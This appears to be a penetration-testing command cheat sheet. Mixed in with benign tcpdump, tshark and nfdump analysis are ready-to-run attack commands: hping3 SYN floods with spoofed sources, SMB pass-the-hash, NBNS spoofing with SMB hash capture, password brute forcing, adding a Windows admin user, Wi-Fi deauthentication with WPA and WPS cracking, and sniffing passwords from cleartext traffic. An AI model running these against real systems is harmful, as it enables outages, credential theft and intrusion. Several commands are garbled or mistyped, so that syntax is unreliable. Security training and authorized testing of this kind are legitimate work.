##-===============-##
##   [+] Crawl
##-===============-##
sqlmap -u http://$IP --dbms=mysql --crawl=3


##-===============-##
##   [+]
##-===============-##
sslscan $domain:443





##-=============================-##
##  [+] ICMP Ping
##-=============================-##
hping3 -1 $IP


##-=============================-##
##  [+] ACK Scan on port 80
##-=============================-##
hping3 -A $IP -p 80


##-=============================-##
##  [+] UDP Scan on port 80
##-=============================-##
hping3 -2 $IP p 80


##-=============================-##
##  [+] SYN Scan on port 50-60
##-=============================-##
hping3 -8 50-60 -s $IP -v


##-=============================-##
##  [+] FIN PUSH URG Scan
##-=============================-##
hping3 -F -p -U $IP -p 80


##-=============================-##
##  [+] Scan Entire Subnet
##-=============================-##
hping3 -1 10.0.1.x --rand-dest -I eth0


##-=======================================================-##
##  [+] Intercept All Traffic Containing HTTP Signature:
##-=======================================================-##
hping3 -9 HTTP -I eth0


##-=======================================-##
##  [+] Collect Initial Sequence Number:
##-=======================================-##
hping3 $IP -Q -p 139 -s





##-=============================-##
##  [+]
##-=============================-##
hping3 -S -p 53 $IP


##-=============================-##
##  [+]
##-=============================-##
hping3 --udp -p 500 $IP
hping3 --udp -p 123 $IP



##-=============================-##
##  [+]
##-=============================-##
hping3 -V -p 80 -s 5050 <scan_type> $Domain


  * `-V|--verbose` - verbose mode
  * `-p|--destport` - set destination port
  * `-s|--baseport` - set source port
  * `<scan_type>` - set scan type
    * `-F|--fin` - set FIN flag, port open if no reply
    * `-S|--syn` - set SYN flag
    * `-P|--push` - set PUSH flag
    * `-A|--ack` - set ACK flag (use when ping is blocked, RST response back if the port is open)
    * `-U|--urg` - set URG flag
    * `-Y|--ymas` - set Y unused flag (0x80 - nullscan), port open if no reply
    * `-M 0 -UPF` - set TCP sequence number and scan type (URG+PUSH+FIN), port open if no reply



##-=============================-##
##  [+]
##-=============================-##
hping3 -V -c 1 -1 -C 8 $Domain


  * `-c [num]` - packet count
  * `-1` - set ICMP mode
  * `-C|--icmptype [icmp-num]` - set icmp type (default icmp-echo = 8)



##-=============================-##
##  [+]
##-=============================-##
hping3 -V -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source <remote_host>





##-======================-##
##   [+] HPING3 Scans
##-======================-##
hping3 -c 3 -s 53 -p 80 -S 192.168.0.1

## Open = flags = SA
## Closed = Flags = RA
## Blocked = ICMP unreachable
## Dropped = No response



## takes a text file called udp.txt and sends probes to each UDP port number listed in that file

for port in `cat udp.txt`; do echo TESTING UDP PORT: $port; hping3 -2 -p $port -c 1 $IP; done



DoS from spoofed IPs:

hping3 $TargetIP --flood --frag --spoof $ip --destport # --syn




hping3 -S -p 25 -c 5 host Send 5 TCP packets, with the SYN flag set, to port 25 of remote host
hping3 --scan 1-1024 -S host Perform a SYN scan on ports 1 to 1024 against the remote host
hping3 --udp --rand-source --data 512 host Send UDP packets with random source address and a data body size
of 512 bytes
hping3 -S -p 80 --flood host Perform a TCP SYN flood DoS attack against a webserver
hping3 -A -p 25 host




smb:// ip /share                            ## Access windows smb share
share user x.x.x.x c$                       ## Mount Windows share
smbclient -0 user\\\\ ip \\ share           ## Sl1B connect

/var/log/messages | grep DHCP               ## List DHCP assignments
echo "1" /proc/sys/net/ipv4/ip forward      ## Turn on IP Forwarding

scp /tmp/$File user@x.x.x.x:/tmp/$File        ## Put file
scp user@ remoteip :/tmp/$File /tmp/$File     Get file




##-====================================-##
##   [+] Service Message Block (SMB)
##-====================================-##
systemctl enable smb
systemctl start
systemctl status smb



##-=============================-##
##  [+]
##-=============================-##
smbclient -L\\ -N -I $IP
smbclient -L //localhost -U $User


##-================================-##
##  [+] Provide the target host:
##-================================-##
smbclient -L\\ -N -I $1 2>&1 | tee "smbclient_$1.txt"



smbclient //MOUNT/share -I target -N




##-================================-##
##  [+] Mount SMB/CIFS shares
##-================================-##
mount.cifs // ip /share /mnt/share -o user=$User,pass=$Pass,sec=ntlrnssp,domain=$Domain,rw


mount -t cifs -o username=$User,password=$Pass //serverip/share_name /mnt/mountlocation

/etc/fstab
//serverip/share_name /mnt/mountlocation cifs username=$User,password=$Pass 0 0


##-====================================-##
##  [+] Mount Remote Windows Share:
##-====================================-##
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=$User,password=$Pass,rw



##-=============================-##
##  [+]
##-=============================-##
## Samba file share on the Samba server,
## the one client user is added to the tdbsam user database

smbpasswd -a $User



##-=========================================================-##
##  [?] user accounts are displayed using a short listing

pdbedit -L



##-==========================-##
## -------------------------- ##
##   [+] SMB Enumeration
## -------------------------- ##
##-==========================-##



##-==========================-##
##   [+] SMB OS Discovery
##-==========================-##
nmap $ip --script smb-os-discovery.nse

##-==========================-##
##   [+] Nmap port scan
##-==========================-##
nmap -v -p 139,445 -oG $File.txt $IP-254

##-======================================-##
##   [+] Netbios Information Scanning
##-======================================-##
nbtscan -r $IP/24               ## Netbios Information Scanning

##-=====================================================-##
##   [+] Netbios Scan - Tee Output To Console +_File:
##-=====================================================-##
nbtscan -rvh $IP 2>&1 | tee "nbtscan-$IP.txt"


##-===========================================-##
##   [+] Nmap find exposed Netbios servers
##-===========================================-##
nmap -sU --script nbstat.nse -p 137 $IP

##-======================================-##
##   [+] Nmap all SMB scripts scan
##-======================================-##
nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script args=unsafe=1 $IP

##-=================================================-##
##   [+] Nmap all SMB scripts authenticated scan
##-=================================================-##
nmap -sV -Pn -vv -p 445 --script-args smbuser=$User,smbpass=$Pass --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip







##-==================================-##
##   [+] SMB Enumeration Tools
##-==================================-##
nmblookup -A $IP

smbclient //MOUNT/share -I $IP -N

rpcclient -U "" $IP

enum4linux $IP
enum4linux -a $IP						## Do all simple enumeration
smbtree -NS 2>/dev/null					## smb network browser

smbgetserverinfo -v -i $IP
smbdumpusers -i $IP



smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'

##-===============================-##
##   [+] SMB Finger Printing
##-===============================-##
smbclient -L //$IP

##-======================================-##
##   [+] Nmap Scan for Open SMB Shares
##-======================================-##
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=$User,smbpass=$Pass -p445 192.168.10.0/24

##-================================================-##
##   [+] Nmap scans for vulnerable SMB Servers
##-================================================-##
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $IP


nmap --script="+*smb* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln $ip



##-==============================-##
##   [+] NBNS Spoof / Capture
##-==============================-##

##-=====================-##
##   [+] NBNS Spoof
##-=====================-##
msf > use auxiliary/spoof/nbns/nbns_response
msf auxiliary(nbns_response) > show options
msf auxiliary(nbns_response) > set INTERFACE eth0
msf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10
msf auxiliary(nbns_response) > run


##-=====================-##
##   [+] SMB Capture
##-=====================-##
msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb
msf auxiliary(smb) > run





## ----------------------------------------------------------------------- ##
##   [?] accceck - Windows Password dictionary attack tool for SMB
## ----------------------------------------------------------------------- ##
acccheck.pl -T $SMBIPs.txt -v >> $File.txt


##-=====================================================================-##
##   [+] Attempt the 'Administrator' account with a [BLANK] password:
##-=====================================================================-##
acccheck -t $IP

##-=====================================================================================-##
##   [+] Attempt all passwords in 'password.txt' against the 'Administrator' account:
##-=====================================================================================-##
acccheck -t $IP -P $File.txt


##-================================================================================-##
##   [+] Attempt all password in 'password.txt' against all users in 'users.txt':
##-================================================================================-##
acccehck -t $IP -U $UsersFile.txt -P $PassFile.txt

##-=========================================================-##
##   [+] Attempt a single password against a single user:
##-=========================================================-##
acccheck -t $IP -u $User -p $Pass



##-==================================================-##
##   [+] Search The NMap Directory For SMB Scripts
##-==================================================-##
ls /usr/share/nmap/scripts/* | grep smb



##-===============================-##
##   [+] Netbios Enumeration
##-===============================-##
nbtscan -r $IP/24								## Netbios Information Scanning
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt


##-===================================-##
##   [+] Null Session in Windows
##-===================================-##
net use \\192.168.0.1\IPC$ "" /u:""

##-================================-##
##   [+] Null Session in Linux
##-================================-##
smbclient -L //192.168.99.131

smbclient -L=10.0.2.15
smbclient \\\\10.0.2.15\\tmp


##-==============================-##
##   [+] Windows Information
##-==============================-##
ipconfig /all
systeminfo
net localgroup administrators
net view
net view /domain

##-==========================-##
##   [+] Add Windows User
##-==========================-##
net user $User password@1 /add
net localgroup administrators username /add


List existing group mapping entries.
net groupmap list


##  Perform a raw LDAP search on a ADS server and dump the results
net ads search '(objectCategory=group)' sAMAccountName

##  The LDAP DN and the attributes are a list of
##  LDAP fields to show in the result
net ads dn 'CN=administrator,CN=Users,DC=my,DC=domain' SAMAccountName



net getauthuser				## Get the current winbind auth user settings.
net status shares			##
net printing dump			## Dump tdb printing file

net rap service				## List services on remote server
net rap service start		## Start service on remote server
net rap service stop		## Stop named serve on remote server


--user=$User				## user name
--server=$Server			## server name
--workgroup=$Workgroup		##
--ipaddress=$IP				## address of target server
--machine-pass $Pass		## Authenticate as machine account
--encrypt					## Encrypt SMB transport








net usershare add $ShareName $Path [comment [acl] [guest_ok=[y|n]]] - to add or change a user defined share.
net usershare delete sharename - to delete a user defined share.
net usershare info [-l|--long] [wildcard sharename] - to print info about a user defined share.
net usershare list [-l|--long] [wildcard sharename] - to list user defined shares.

net [rpc] conf list - Dump the complete configuration in smb.conf like format.
net [rpc] conf import - Import configuration from file in smb.conf format.
net [rpc] conf listshares - List the registry shares.
net [rpc] conf drop - Delete the complete configuration from registry.
net [rpc] conf showshare - Show the definition of a registry share.
net [rpc] conf addshare - Create a new registry share.
net [rpc] conf delshare - Delete a registry share.
net [rpc] conf setparm - Store a parameter.
net [rpc] conf getparm - Retrieve the value of a parameter.
net [rpc] conf delparm - Delete a parameter.
net [rpc] conf getincludes - Show the includes of a share definition.
net [rpc] conf setincludes - Set includes for a share.
net [rpc] conf delincludes - Delete includes from a share definition.


net ads enctypes list Computername			## List the value of the "msDS-SupportedEncryptionTypes" attribute

net dom join - Join a remote computer into a domain.
net dom unjoin - Unjoin a remote computer from a domain.
net dom join -S xp -U XP\\administrator%secret domain=MYDOM account=MYDOM\\administrator password=topsecret reboot

net eventlog dump - Dump a eventlog *.evt file on the screen



net registry enumerate   			#[?] Enumerate registry keys and values.
net registry enumerate_recursive 	#[?] Enumerate registry key and its subkeys.
net registry createkey   			#[?] Create a new registry key.
net registry deletekey   			#[?] Delete a registry key.
net registry deletekey_recursive 	#[?] Delete a registry key with subkeys.
net registry getvalue    			#[?] Print a registry value.
net registry getvalueraw 			#[?] Print a registry value (raw format).
net registry setvalue    			#[?] Set a new registry value.
net registry increment   			#[?] Increment a DWORD registry value under a lock.
net registry deletevalue 			#[?] Delete a registry value.
net registry getsd       			#[?] Get security descriptor.
net registry getsd_sdd1  			#[?] Get security descriptor In sddl format.
net registry setsd_sdd1  			#[?] Set security descriptor from sddl format string.
net registry import      			#[?] Import a registration entries (.reg) file.
net registry export      			#[?] Export a registration entries (.reg) file.
net registry convert     			#[?] Convert a registration entries (.reg) file.
net registry check       			#[?] Check and repair a registry database.




systemctl start slapd.service
systemctl enable slapd.service > /dev/null 2>&1
slappasswd -s 1234 -n > /etc/openldap/passwd


Anonymous Bind:
ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"

Authenticated:
ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W



Look for anonymous bind
ldapsearch -x -b "dc=megabank,dc=local" "*" -h $ip



slapcat -v -l backup_ldap.ldif


ps -ef | grep slapd

/etc/default/slapd
/etc/ldap/
ldap.conf		--> basic server config
sasl2/			--> SASL2 authentication support
schema/			--> default schemas
slapd.d/		--> new/modified items/ldifs data - do not edit manually, use instead: slapd-config, ldapadd, ldapmodify, ldapdelete,ldapsearch, etc ('dpkg -L ldap-utils' to get a list of all client commands and other files)
/var/lib/ldap	--> DB directory. Contains DITs, ex:

cn=config (default)		- root of configuration of LDAP instance server wide.
dc=frozza, dc=com

/var/run/slapd/
slapd.pid		--> current pid
slapd			--> arguments used during invocation
ldapi			--> UDS

netstat -ntl	--> shows tcp 389


##-======================================-##
##   [+] OpenVAS Vulnerability Scanner
##-======================================-##

##-==============================-##
##   [+] OpenVAS Initial Setup
##-==============================-##


##-==============================-##
##   [+] run the initial setup
##-==============================-##
openvas-setup


##-==================-##
##   [+] add user
##-==================-##
openvas-adduser


##-=====================================================-##
##   [+] launch Greenbone Security Desktop and log in
##-=====================================================-##
gsd


##-=================-##
##   [+] OpenVAS
##-=================-##
openvas-setup
https://localhost:9392




openvas-check-setup
openvas-stop
openvas-start
openvasmd --user=$User --new-password=$Pass
openvasmd --create-user $User








##-===============================-##
##   [+] Vulnerability Scanning
##-===============================-##
nmap -Pn -sT -sU  -p $ports --script=*vuln*  -vv -oN nmap_vuln  $ip






airmon-ng start wlan0				## put your network device into monitor mode

listen for all nearby beacon frames to get target BSSID and channel

airodump-ng mon0


airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0

aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt $File.cap

aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0


# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/$File.cap




Reaver
------

airmon-ng start wlan0
airodump-ng wlan0
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1


Pixie WPS
---------

airmon-ng check
airmon-ng start wlan0
airodump-ng mon0 --wps
reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1




##-=========================-##
##   [+] types of scans:
##-=========================-##

- **Ping sweeps**: Send a variety of packet types (including ICMP Echo Requests, but many others as well).
- **ARP scans**: Identify which hosts are on the same LAN as the machine running Nmap. The ARP scan does not work through a router, because ARP traffic just goes on a single LAN.
- **Connect scans**: Complete the three-way handshake; are slow and easily detected. Because the entire handshake is completed for each port in the scan, the activities are often logged on the target system.
- **SYN scans**: Only send the initial SYN and await the SYN-ACK response to determine if a port is open. The final ACK packet from the attacker is never sent. The result is an increase in performance and a much more stealthy scan. Because most host systems do not log a connection unless it completes the three-way handshake, the scan is less likely to be detected (NOT ANYMORE).
- **ACK scans**: Particularly useful in getting through simple router-based firewalls. If a router allows “established” connections in (and is not using any stateful inspection), an attacker can use ACK scans to send packets into the network. ACK scans are useful for mapping, but not for port scanning.
- **FIN scans**: Send packets with the FIN control bit set in an effort to be stealthy and get through firewalls.
- **FTP Proxy “Bounce Attack” scans**: Bounce an attack off a poorly configured FTP server.
- **“Idle” scans**: This scan type can be used to divert attention, obscuring the attackers location on the network.
- **UDP scanning**: Helps locate vulnerahle UDP services. For most UDP ports, Nmap sends packets with an empty payload. But, for about a dozen specific ports, Nrnap includes an application-appropriate payload for the given port, including UDP port 53 (DNS), 111 (portmapper). 161 (SNMP), etc.
- **Version scanning**: Tries to detemine the version number of the program listening on a discovered port for both TCP and UDP.
- **IPv6 scanning**: Iterates through a series of lPv6 addresses, scanning for target systems and ports, invoked with the “-6” syntax. Today, all Nmap scan types support a -6 option. In older versions of Nmap, IPv6 scans were limited to ping sweeps to identify target host addresses in use, TCP connect scans, and version scans only.
- **RPC scanning**: Identifies which Remote Procedure Call services are offered by the target machine.
- **TCP sequence prediction**: Useful in spooling attacks, as we shall see in a short while.




# Nmap enumerate SSL ciphers on remote host/port
$ nmap -Pn -p 5986 --script=ssl-enum-ciphers <TARGET>


# HPING3 Scans
hping3 -c 3 -s 53 -p 80 -S 192.168.0.1
# Open = flags = SA
# Closed = Flags = RA
# Blocked = ICMP unreachable
# Dropped = No response

# Metasploit Auxiliarys:
metasploit> use auxiliary/gather/dns



### Finger - Enumerate Users

finger @192.168.0.1
finger -l -p user@ip-address
metasploit> use auxiliary/scanner/finger/finger_users





##-======================================-##
##   [+] Get Cisco network information
##-======================================-##
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'


##-======================================-##
##   [+] analyze traffic remotely over ssh w/ wireshark
##-======================================-##
ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -




tcpdump ‐n ‐r $File.pcap | awk ‐F" " '{print $3}' | sort ‐u | head



##-=============================================================-##
##   [+] select traffic between helios and either hot or ace:
##-=============================================================-##
host helios and \( hot or ace \)


##-======================================================================-##
##   [+] select all IP packets between ace and any host except helios:
##-======================================================================-##
ip host ace and not helios


##-================================================================-##
##   [+] select all ftp traffic through internet gateway snup:
##-================================================================-##
gateway snup and (port ftp or ftp-data)


##-==========================================================================-##
##   [+] Select traffic neither sourced from nor destined for local hosts
##-==========================================================================-##
ip and not net localnet


##-==========================================-##
##   [+] select the start and end packets
##-==========================================-##
## ------------------------------------------------------------ ##
##   [?] The SYN and FIN packets of each
##       TCP conversation that involves a non-local host.
## ------------------------------------------------------------ ##
tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet


##-=========================================================-##
##   [+] select all IPv4 HTTP packets to and from port 80
##   [+] print only packets that contain data
##-=========================================================-##
## ---------------------------------------------------------------------- ##
##   [?] for example, not SYN and FIN packets and ACK-only packets.
## ---------------------------------------------------------------------- ##
tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)


##-===================================================-##
##   [+] select IP packets longer than 576 bytes
##   [+] sent through gateway snup:
##-===================================================-##
gateway snup and ip[2:2] > 576


##-=================================================================-##
##   [+] select IP broadcast or multicast packets
##   [+] that were not sent via Ethernet broadcast or multicast:
##-=================================================================-##
ether[0] & 1 = 0 and ip[16] >= 224


##-===================================================================-##
##   [+] select all ICMP packets that are not echo requests/replies
##-===================================================================-##
## ---------------------------------- ##
##   [?] (i.e., not ping packets)
## ---------------------------------- ##
icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply


##-====================================-##
##   [+] catch all multicast traffic
##-====================================-##
'ether[0] & 1 != 0'


##-============================================-##
##   [+] catch all IPv4 packets with options
##-============================================-##
'ip[0] & 0xf != 5'


##-===============================================-##
##   [+] catch only unfragmented IPv4 datagrams
##-===============================================-##
'ip[6:2] & 0x1fff = 0'


##-==========================================================-##
##   [+] match only tcp packets whose source port is $Port
##-==========================================================-##
tcp src port $Port


##-====================================-##
##   [+]
##-====================================-##
tcp port 21, 'udp portrange 7000-7009', 'wlan addr2 0:2:3:4:5:6'


##-====================================-##
##   [+]
##-====================================-##
portrange port1-port2


##-====================================-##
##   [+]
##-====================================-##
port domain





##-===================================================-##
##   [+]
##-===================================================-##
tcpxtract --file $File.pcap --output $File --device eth0





## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 tcp
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 port 22
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 src 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 dst 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'tcp port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -w out.pcap -s 65535 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -r $Capture.pcap                             ## Read the file
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n src host 192.168.2.10 -r $Capture.pcap     ## Filter By Source
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n dst host 192.168.2.12 -r $Capture.pcap     ## Filter By Destination
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n port 443 -r $Capture.pcap                  ## Filter By Port
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -nX -r $Capture.pcap                          ## Read the file and dump in hex format
## ------------------------------------------------------------------------------------------------ ##



##-====================================-##
##   [+] convert a .cap file to .txt:
##-====================================-##
tshark -V -r $File > $File




## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port http' -Y http -l -N nNC		## HTTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port smtp' -Y smtp -l -N nNC		## SMTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port imap' -Y imap -l -N nNC		## IMAP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##



##-===========================================-##
##  		[+] Protocol Statistics:
##-===========================================-##
tshark -r $File -q -z ptype,tree


##-============================================-##
##  			[+] HTTP Statistics
##-============================================-##
tshark -r $File -q -z http,stat,


##-===================================================-##
##  		[+] HTTP Statistics with Rates
##-===================================================-##
tshark -r $File -q -z http,tree


##-===================================================-##
##  		[+] TOP 10 HTTP Request URL
##-===================================================-##
tshark -r $File -R http.request -T fields -e http.host | sed -e 's/?.*$//' | sed -e 's#^\(.*\)\t\(.*\)$#http://\1\2#' | sort | uniq -c | sort -rn | head -n 10


##-===================================================-##
##  		[+] TOP 10 talkers by Source IP
##-===================================================-##
tshark -r $File -T fields -e ip.src | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 talkers by DST IP
##-===================================================-##
tshark -r $File -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10


##-=====================================================-##
##   [+] TOP 10 talkers by port usage or SYN attempts
##-=====================================================-##
tshark -r $File -T fields -e ip.src "tcp.flags.syn==1 && tcp.flags.ack==0" | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] HTTP 10 Response Code 200 and Content Type
##-===================================================-##
tshark -r $File -R http.response.code==200 -T fields -e "http.content_type" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  	[+] TOP HTTP Host and Request Method
##-===================================================-##
tshark -r $File -R http.host -T fields -e http.host -e http.request.method |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query DST Host
##-===================================================-##
tshark -r $File -T fields -e dns.qry.name -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query by Soure IP
##-===================================================-##
tshark -r $File -T fields -e ip.src -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 ICMP Conversations
##-===================================================-##
tshark -r $File -V icmp -T fields -e icmp.ident -e ip.src |sort |uniq -c | sort -rn | head -10



## ---------------------------------------------------------------------- ##
##   [?] Use a filesize-based “ring buffer” of 10 files, 100MB each.
##   [?] Overwrite oldest file after 10 files have been created.
##   [?] 2nd+ output files will have a digit appended to the filename
##   [?] (e.g. “output.pcap0”, output.pcap1”, etc.).
## ---------------------------------------------------------------------- ##
tcpdump -nn -i eth0 -w $File.pcap -C 100 -W 10


## ---------------------------------------------------------------------- ##
##   [?] Use a time-based ring buffer with 14 files,
##   [?] which contain 12 hours (43,200 seconds).
##   [?] Overwrite oldest file after 10 files have been created.
##   [?] Filenames will contain appended digits as described above.
## ---------------------------------------------------------------------- ##
tcpdump -nn -i eth0 -w $File.pcap -G 43200 -W 14


##-============================================================================-##
##   [+] capture the entire contents of each packet (a.k.a “snaplen zero”.)
##-============================================================================-##
tcpdump -nn -i eth0 -w $File.pcap -s 0


##-===================================================-##
##   [+] Capture only first 56 bytes of each frame
##-===================================================-##
## -------------------------------------------------------------- ##
##   [?] enough to cover the IP header and typical TCP header.
## -------------------------------------------------------------- ##
tcpdump -nn -i eth0 -w $File.pcap -s 56



##-===================================================-##
##   [+]
##-===================================================-##
tshark -f "tcp port 80" -i eth0


##-==================================-##
##   [+] listening on UDP port 53:
##-==================================-##
tcpdump -As80 -tni eth0 "udp port 53"


##-===========================-##
##   [+] Password Sniffing
##-===========================-##
tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-


##-===================================================-##
##   [+]
##-===================================================-##
tshark –r $File.pcap -2 –R http.request.uri –Tfields –e ip.dst –e http.request.full_uri –e http.user_agent –e data –E separator=, | cut –c1-91


##-=======================================================-##
##    [+] Filter out traffic with a source MAC of $MAC
##-======================================================-##
tshark -r $File.cap -2 -R "wlan.sa==$MAC && wlan.fc.type_subtype==0x08" -T fields -e frame.time.delta | head -n 2








+ Softflowd allows us to send the netflows according to our network data
+ Nfdump has the tools to get and process the netflow files that we have gotten from softflowd

**_Settings_**

Softflowd_

We can modify the softflowd interface
define the IP and port.

/etc/default/softflowd


##-============================-##
##    [+] start the demon softflowd
##-============================-##
/etc/init.d/softflowd start

##-========================================================-##
##    [+] check If we are getting the data and changing them to flows.
##-========================================================-##

softflowd -i interface -n IP:PORT -D

##-====================================-##
##     [+] Shows the statistics of the flows
##-====================================-##

softflowctl statistics








systemctl enable nfdump.service
```
Let's stop the service to change the settings (the port)
```
sudo pico /lib/systemd/system/nfdump.service
```
The nfdump's settings file is this
```
sudo vi /lib/systemd/system/nfdump.service
```
Reload systemd daemons and start ndfdump:
```
sudo systemctl daemon-reload
sudo systemctl start nfdump.service
```
We can be sure if the ports are OK using the netstat
```
netstat -n --udp --listen
```
Using the next command we can print the data through nfdump
```
nfdump -R /var/cache/nfdump
```

## Ndfump to manage the flows

nfdump -r nfcapd.2017xxxxx -o extended -o csv -q

Convert to CSV
```
nfdump -r file -o csv > output.csv
```
We can see the information of each field in the next URL "https://github.com/phaag/nfdump/blob/4dafc2dc050a7371afb2e0934f7989876bfc0870/bin/parse_csv.pl"

Filter IP
```
nfdump -r [input file] 'net 8.8.8.8/32'








##-===================================================-##
##   [+]
##-===================================================-##
nfdump -r $File -o "fmt:<fmt str>"



##-====================================================-##
##   [+] Extract Src Address,Dst Address, and Packets
##-====================================================-##
nfdump -r $File -o "fmt:%pkt,%sa,%da" > $File.csv



## ----------------------------------- ##
##    [?] Packets           | %pkt |
##    [?] Src Address       | %sa  |
##    [?] Dst Address       | %da  |
##    [?] TCP Flags         | %flg |
##    [?] Protocol          | %pr  |
##    [?] Src Address:Port  | %sap |
##    [?] Dst Address:Port  | %dap |
## ----------------------------------- ##


##-=========================================-##
##   [+] Read From File, Extracting Out:
##-=========================================-##
##   > Packets
##   > Src Address:Port
##   > Dst Address:Port
##   > TCP Flags
##-=========================================-##
nfdump -r $File -o "fmt:%pkt,%sap,%dap,%flg" > $File.csv



##-=============================================-##
##   [+] View the “topN” talkers to identify
##       the noisiest IPs by flow count.
##-=============================================-##
nfdump -r $File -s ip/flows -n 10


##-================================================================-##
##   [+] Display a limited number of records with the -c switch.
##-================================================================-##
nfdump -r $File -c <record_limit>


##-======================================-##
##   [+] Curl SOCKS5 Proxy Connection:
##-======================================-##
curl -s -m 10 --socks5 $hostport --socks5-hostname $hostport -L $URL


##-===========================================-##
##   [+] Bulk Download Files By Their URLs
##-===========================================-##
## ------------------------------------------------ ##
##   [?] The URL Links Are Fed To Curl From xarg
## ------------------------------------------------ ##
xargs -n 1 curl -O < $File






# geoip lookup

geoip(){curl -s "http://www.geody.com/geoip.php?ip=${1}" | sed '/^IP:/!d;s/<[^>][^>]*>//g' ;}



# Show current weather for any US city or zipcode

weather() { lynx -dump "http://mobile.weather.gov/port_zh.php?inputstring=$*" | sed 's/^ *//;/ror has occ/q;2h;/__/!{x;s/\n.*//;x;H;d};x;s/\n/ -- /;q';}







##-===============================================================-##
##   [+] Download all recently uploaded pastes on pastebin.com
##-===============================================================-##
elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget





##-======================================-##
##   [+]
##-======================================-##
grep 'href='
file
1 cut -d"/" -f3
I grep
url
lsort -u


##-======================================-##
##   [+] Check for title and all links
##-======================================-##
curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'


##-===================================-##
##   [+] Look at page with just text
##-===================================-##
curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq


##-===============================-##
##  [+] Remove the User Agent
##-===============================-##
curl -A '' $Domain


##-==================================-##
##  [+] Send an Empty User Agent
##-==================================-##
curl -A '' -H 'User-Agent;' $Domain


##-===============================-##
##  [+] Save Cookies to a File
##-===============================-##
curl -c cookies.txt $Domain


##-=================================-##
##  [+] Load Cookies from a File
##-=================================-##
curl -b cookies.txt $Domain


##-=================================-##
##  [+] Capture Session Token:
##-=================================-##
wget -q --save-cookies=$Cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" http://$URL/login.php




